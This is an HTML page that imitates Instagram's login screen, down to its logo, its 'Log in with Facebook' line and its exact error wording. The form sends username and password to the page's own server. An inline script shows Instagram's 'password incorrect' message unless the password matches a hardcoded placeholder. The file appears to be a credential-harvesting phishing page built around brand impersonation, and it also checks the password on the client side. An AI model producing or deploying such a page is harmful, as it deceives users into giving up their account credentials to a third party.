<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="/static/styles.css">
    <link rel="shortcut icon" href="/static/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
    <style>
        .error-message {
            display: none;
            color: red;
        }
    </style>
</head>
<body>
    <div class="image__login">
        <img src="/static/instagramimg.png" alt="">
    </div>
    <div class="insta__form">
        <div class="login__form">
            <img src="/static/instalogo.png">
            <form class="form" method="post" action="/" id="login-form">
                <input type="text" name="username" placeholder="Phone number, username, or email">
                <input type="password" name="password" placeholder="Password">
                <button type="submit">Log in</button>
                <span class="or">OR</span>
            </form>
            <h3>
                <i class='bx bxl-facebook-circle'></i>
                Log in with Facebook
            </h3>
            <!-- Error message display -->
            <p class="error-message" id="error-message"></p>
            <span class="forget">Forgot Password?</span>
        </div>
    </div>
    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            var username = this.querySelector('input[name="username"]').value;
            var password = this.querySelector('input[name="password"]').value;

            if (password !== 'correct_password') { // Replace 'correct_password' with your actual password
                event.preventDefault();
                var errorMessage = document.getElementById('error-message');
                errorMessage.style.display = 'block';
                errorMessage.innerText = "Sorry, your password was incorrect. Please double-check your password.";
            }
        });
    </script>
</body>
</html>
